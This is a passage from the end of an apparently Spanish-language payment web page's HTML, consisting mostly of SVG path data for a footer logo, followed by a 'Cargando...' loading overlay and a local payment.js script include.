75.2893 16.2089Z"
          fill="#82C72D"
        ></path>
        <path
          d="M52.1322 11.342C51.8824 11.2167 51.7575 11.4256 51.6534 11.6031C51.5806 11.7389 51.5181 11.8851 51.4661 12.0313C51.0602 12.9921 50.6647 13.953 50.2588 14.9138C49.9153 15.718 49.5719 16.5222 49.2284 17.3472C48.9995 17.2115 48.9786 17.0235 48.9162 16.8668C48.1877 15.1645 47.4591 13.4517 46.7306 11.7389C46.6265 11.5091 46.5432 11.1854 46.1894 11.342C45.8563 11.4882 46.0229 11.7493 46.1165 11.9686C47.0012 14.047 47.8858 16.1149 48.7809 18.1932C48.8642 18.3812 48.9162 18.6109 49.1868 18.5901C49.4262 18.5796 49.4886 18.3707 49.5615 18.2036C49.8737 17.483 50.1755 16.7624 50.4774 16.0522C51.0706 14.6632 51.6534 13.2741 52.2467 11.8851C52.3195 11.6762 52.3716 11.4673 52.1322 11.342Z"
          fill="#82C72D"
        ></path>
        <path
          d="M126.36 27.9687C125.808 27.9373 125.59 27.7076 125.569 27.1436C125.548 26.4961 125.569 25.859 125.548 25.2115C125.538 24.9086 125.663 24.8146 125.954 24.8146C126.287 24.8146 126.755 24.9086 126.755 24.4073C126.755 23.8956 126.287 24 125.954 24.0105C125.621 24.0209 125.538 23.8747 125.548 23.5718C125.558 23.2585 125.558 22.9452 125.527 22.6319C125.496 22.3499 125.309 22.2037 125.028 22.2141C124.757 22.2246 124.611 22.3812 124.591 22.6423C124.57 22.9139 124.559 23.1958 124.58 23.4778C124.601 23.812 124.57 24.0627 124.133 24.0209C123.893 24 123.748 24.1462 123.737 24.4073C123.727 24.6371 123.862 24.8146 124.07 24.7937C124.58 24.7624 124.611 25.0653 124.591 25.4517C124.57 25.7128 124.591 25.9739 124.591 26.235C124.591 26.5796 124.57 26.9347 124.591 27.2794C124.653 28.2402 125.413 28.94 126.339 28.9191C126.662 28.9086 126.943 28.846 126.953 28.4491C126.964 28.0313 126.693 27.9896 126.36 27.9687Z"
          fill="#82C72D"
        ></path>
        <path
          d="M103.598 26.141C103.057 25.9321 102.474 25.9321 101.954 25.6815C101.725 25.577 101.517 25.4308 101.548 25.1384C101.579 24.8668 101.798 24.7728 102.016 24.7102C102.62 24.5431 103.182 24.6475 103.692 25.0235C103.931 25.201 104.223 25.295 104.431 25.0026C104.639 24.7102 104.42 24.47 104.191 24.2924C103.702 23.9164 103.14 23.7702 102.453 23.7702C102.193 23.7911 101.839 23.812 101.517 23.9582C101.017 24.188 100.642 24.4909 100.622 25.1175C100.59 25.765 100.944 26.1097 101.454 26.3707C101.819 26.5483 102.204 26.6214 102.599 26.7154C102.786 26.7572 102.974 26.7885 103.151 26.8616C103.432 26.9765 103.702 27.1436 103.671 27.4987C103.64 27.8538 103.359 27.9791 103.057 28.0418C102.433 28.1671 101.85 28.0835 101.34 27.6658C101.038 27.4151 100.736 27.342 100.486 27.6971C100.237 28.0522 100.476 28.2924 100.767 28.4595C101.558 28.9191 102.412 29.107 103.317 28.8773C103.754 28.7728 104.181 28.5744 104.42 28.1566C104.91 27.3316 104.566 26.5065 103.598 26.141Z"
          fill="#82C72D"
        ></path>
        <path
          d="M70.6787 18.6318C70.8973 18.6318 71.1887 18.6841 71.1991 18.3603C71.2095 18.0365 70.9181 18.0679 70.6995 18.0679C69.69 18.0574 68.6908 18.0157 67.6917 18.0679C67.1713 18.0992 67.0776 17.9008 67.0881 17.4517C67.1089 16.5535 67.0985 15.6449 67.0985 14.7363C67.0985 13.765 67.0985 12.7937 67.0985 11.812C67.0985 11.5718 67.0881 11.3211 66.7862 11.3107C66.4428 11.3003 66.422 11.5718 66.422 11.8224C66.422 13.8903 66.4324 15.9582 66.422 18.0261C66.422 18.4752 66.5989 18.6318 67.0464 18.6318C68.2537 18.6214 69.4714 18.6423 70.6787 18.6318Z"
          fill="#82C72D"
        ></path>
        <path
          d="M76.1219 23.8225C75.5183 23.6658 74.9563 23.7598 74.4255 24.094C74.259 24.1984 74.082 24.3655 73.9259 24.0627C73.8114 23.8329 73.5825 23.7702 73.3431 23.8433C73.1037 23.9165 73.0413 24.1253 73.0413 24.3342C73.0413 25.7024 73.0413 27.0809 73.0517 28.4491C73.0517 28.7624 73.2286 28.9295 73.5512 28.9086C73.8531 28.8877 73.9884 28.7206 73.9884 28.4282C73.9884 27.9791 73.9884 27.53 73.9884 27.0705C73.9884 27.0705 73.9884 27.0705 73.9988 27.0705C73.9988 26.6319 73.9884 26.2037 73.9988 25.765C74.0196 25.2428 74.2694 24.8877 74.7793 24.7102C75.1852 24.564 75.6016 24.6057 76.0075 24.6475C76.2572 24.6684 76.5174 24.7102 76.5903 24.3864C76.6631 24.0313 76.4029 23.8956 76.1219 23.8225Z"
          fill="#82C72D"
        ></path>
        <path
          d="M86.0717 23.8224C85.468 23.6762 84.906 23.7702 84.3856 24.1044C84.2399 24.1984 84.0734 24.3655 83.9277 24.0835C83.7924 23.8433 83.5634 23.7598 83.3032 23.8538C83.0222 23.9478 82.991 24.2089 82.991 24.4491C82.9806 25.0862 82.991 25.7337 82.991 26.3708C82.991 27.0078 82.9806 27.6553 82.991 28.2924C82.991 28.6057 83.0535 28.8982 83.4594 28.8982C83.8757 28.8982 83.9797 28.6475 83.9693 28.282C83.9589 27.4674 83.9693 26.6527 83.9693 25.8381C83.9797 25.201 84.2191 24.8668 84.8124 24.6893C85.187 24.5744 85.5617 24.6162 85.9468 24.6475C86.207 24.6684 86.5088 24.7311 86.5609 24.3655C86.6233 24.0104 86.3527 23.8851 86.0717 23.8224Z"
          fill="#82C72D"
        ></path>
        <path
          d="M122.821 23.8538C122.665 23.7807 122.488 23.7493 122.322 23.7285C121.833 23.6867 121.354 23.7493 120.927 24.0418C120.792 24.1358 120.646 24.2924 120.49 24.0522C120.334 23.8016 120.105 23.6867 119.824 23.812C119.522 23.9373 119.491 24.2193 119.491 24.5117C119.491 25.1175 119.491 25.7232 119.491 26.329C119.491 26.9869 119.491 27.6449 119.491 28.3029C119.491 28.6475 119.616 28.9504 120.011 28.9504C120.407 28.9399 120.511 28.658 120.511 28.3029C120.5 27.5091 120.511 26.705 120.511 25.9112C120.511 25.2324 120.781 24.8877 121.427 24.7102C121.801 24.6057 122.176 24.6162 122.551 24.6997C122.811 24.7624 123.05 24.6893 123.144 24.4073C123.248 24.1253 123.05 23.9582 122.821 23.8538ZM119.73 25.8277C119.73 25.8068 119.73 25.7754 119.741 25.7546C119.73 25.7754 119.73 25.8068 119.73 25.8277ZM119.99 24.6475C119.99 24.6475 119.99 24.6371 119.99 24.6475V24.6475ZM120.032 24.1462C120.063 24.1566 120.094 24.1671 120.115 24.188C120.094 24.1775 120.063 24.1671 120.032 24.1462Z"
          fill="#82C72D"
        ></path>
        <path
          d="M83.0951 22.1201C83.1055 21.7859 82.8973 21.6501 82.5955 21.6501C80.9511 21.6397 79.3067 21.6501 77.6622 21.6501C77.3708 21.6501 77.1419 21.7755 77.1523 22.1097C77.1627 22.4334 77.3812 22.5483 77.6831 22.5483C78.1826 22.5483 78.6926 22.5692 79.1922 22.5483C79.5356 22.5274 79.6605 22.6736 79.6709 22.987C79.6709 23.0496 79.6709 23.1227 79.6709 23.1854C79.6605 24.6789 79.6501 26.1723 79.6397 27.6658C79.6397 27.9478 79.6293 28.2193 79.6605 28.5013C79.6917 28.7833 79.8791 28.9295 80.1601 28.9191C80.4203 28.9086 80.5868 28.7624 80.618 28.5118C80.6388 28.3447 80.6388 28.1671 80.6388 27.9896C80.6388 26.3394 80.6492 24.6893 80.6388 23.0392C80.6388 22.6841 80.7533 22.5379 81.1176 22.5588C81.6172 22.5796 82.1167 22.5692 82.6267 22.5588C82.8765 22.5379 83.0846 22.423 83.0951 22.1201Z"
          fill="#82C72D"
        ></path>
        <path
          d="M97.4681 23.9165C96.7604 23.6554 96.0735 23.718 95.4178 24.1045C95.2721 24.188 95.116 24.376 94.9598 24.0836C94.8454 23.8538 94.6268 23.7807 94.3874 23.8434C94.096 23.9269 94.0544 24.1776 94.0544 24.4282C94.044 25.7128 94.044 26.9974 94.0544 28.282C94.0544 28.6162 94.1272 28.94 94.5643 28.9191C94.9911 28.8982 95.0223 28.5744 95.0223 28.2402C95.0223 27.4569 95.0119 26.6736 95.0223 25.8904C95.0327 25.3473 95.2929 24.9817 95.8029 24.7833C96.5314 24.5013 97.1559 24.6893 97.7075 25.1906C97.8948 25.7024 97.9469 26.2246 97.926 26.7676C97.9156 27.2585 97.926 27.7389 97.926 28.2298C97.926 28.5953 97.9781 28.9191 98.436 28.9191C98.8627 28.9191 98.9148 28.5744 98.9148 28.2507C98.9252 27.4987 98.946 26.7572 98.9044 26.0052C98.8523 25.0235 98.436 24.2611 97.4681 23.9165Z"
          fill="#82C72D"
        ></path>
        <path
          d="M53.9119 18.5901C54.2554 18.5901 54.2241 18.329 54.2241 18.1097C54.2241 17.0548 54.2241 15.9896 54.2241 14.9347C54.2241 13.8904 54.2241 12.8564 54.2241 11.812C54.2241 11.5823 54.2345 11.3212 53.9119 11.3212C53.6101 11.3212 53.5893 11.5718 53.5893 11.812C53.5893 13.9112 53.5893 16.0105 53.5893 18.1097C53.5997 18.3394 53.5893 18.5901 53.9119 18.5901Z"
          fill="#82C72D"
        ></path>
        <path
          d="M64.0698 18.5692C64.3612 18.5692 64.3716 18.329 64.3716 18.1201C64.3716 16.0209 64.3716 13.9112 64.3716 11.812C64.3716 11.5822 64.33 11.3629 64.0698 11.3525C63.768 11.342 63.7888 11.6031 63.7888 11.8016C63.7888 12.8459 63.7888 13.8903 63.7888 14.9347C63.7888 16 63.7888 17.0548 63.7888 18.1201C63.7992 18.3185 63.7576 18.5692 64.0698 18.5692Z"
          fill="#82C72D"
        ></path>
        <path
          d="M90.2868 11.2063C88.174 11.2063 86.4568 12.8877 86.4568 14.9661C86.4568 17.0444 88.174 18.7259 90.2868 18.7259C92.3996 18.7259 94.1168 17.0444 94.1168 14.9661C94.1168 12.8877 92.3996 11.2063 90.2868 11.2063ZM90.2868 18.0783C88.5071 18.0783 87.0604 16.6893 87.0604 14.9661C87.0604 13.2428 88.5071 11.8538 90.2868 11.8538C92.0665 11.8538 93.5132 13.2428 93.5132 14.9661C93.5132 16.6893 92.0665 18.0783 90.2868 18.0783Z"
          fill="#82C72D"
        ></path>
        <path
          fill-rule="evenodd"
          clip-rule="evenodd"
          d="M62.0946 16.1686C62.097 16.6316 62.0993 17.0962 62.0923 17.5561C62.0819 17.953 61.7905 18.141 61.4991 18.2976C60.4063 18.8512 59.3031 18.9243 58.2311 18.4438C56.8469 17.8694 55.8685 16.5326 55.8685 14.966C55.8685 13.6397 56.5554 12.4804 57.6066 11.812C58.8035 10.9556 60.885 10.9765 61.905 11.9791C61.9087 11.9828 61.9124 11.9865 61.916 11.9902C62.0376 12.1118 62.1609 12.2353 62.0195 12.4177C61.8842 12.6057 61.6968 12.6162 61.5199 12.4804C60.6144 11.8224 59.6257 11.6971 58.7515 11.9582C58.46 12.0522 58.179 12.188 57.9293 12.3551H57.9188C57.8969 12.3624 57.8802 12.3749 57.8613 12.3889C57.8533 12.3948 57.8449 12.4011 57.8356 12.4073C57.7419 12.4804 57.6482 12.5535 57.5546 12.6371C57.5546 12.6435 57.5506 12.646 57.5451 12.6494C57.5417 12.6515 57.5377 12.654 57.5338 12.6579C57.2111 12.9504 56.9405 13.3159 56.7532 13.7128C56.6179 14.0156 56.5138 14.3603 56.4826 14.6841C56.4722 14.7154 56.4722 14.7363 56.4722 14.7676V14.8407V14.9243C56.4514 16.6057 57.7419 17.8799 59.2614 18.0783H59.3343V18.0888C59.9067 18.1514 60.5104 18.0574 61.0724 17.7754C61.3222 17.6501 61.4367 17.4935 61.4262 17.2115C61.4054 16.825 61.4054 16.4386 61.4262 16.0626C61.4471 15.7076 61.2909 15.5927 60.9683 15.6136C60.6403 15.6238 60.3224 15.6139 59.9948 15.6036L59.9796 15.6031C59.7818 15.5927 59.5633 15.5405 59.5841 15.2898C59.5945 15.0809 59.7818 15.0391 59.9692 15.0391H61.6344C61.9362 15.0287 62.0923 15.1854 62.0923 15.4778C62.0923 15.7072 62.0935 15.9377 62.0946 16.1686ZM81.3362 18.6423C81.3362 18.6423 80.566 18.6214 79.9415 18.6318C79.5773 18.6423 79.4212 18.4647 79.4212 18.0888V11.7807C79.4212 11.5091 79.4628 11.3316 79.8271 11.342L81.3362 11.3316C83.4489 11.3316 85.1662 12.919 85.1662 14.9347C85.1662 16.9504 83.4489 18.6423 81.3362 18.6423ZM80.4619 11.8851C80.2017 11.8955 80.0872 11.9791 80.0872 12.2506C80.0942 13.4617 80.0919 14.6775 80.0896 15.8948C80.0884 16.504 80.0872 17.1136 80.0872 17.7232C80.0872 17.9948 80.2121 18.0679 80.4723 18.0783H81.2321C83.0118 18.0783 84.5626 16.6162 84.5626 14.9452C84.5626 13.2741 83.0118 11.8642 81.2321 11.8642L80.4619 11.8851Z"
          fill="#82C72D"
        ></path>
      </svg>
    </footer>

    <!-- LOADER FULL -->
    <div class="loaderp-full">
      <span class="loaderp"></span>
      <p class="text-italic tc-ocean fs-3 fw-light">Cargando...</p>
    </div>

    <!-- SCRIPTS -->
    <script src="./js/payment.js"></script>
  </body>
</html>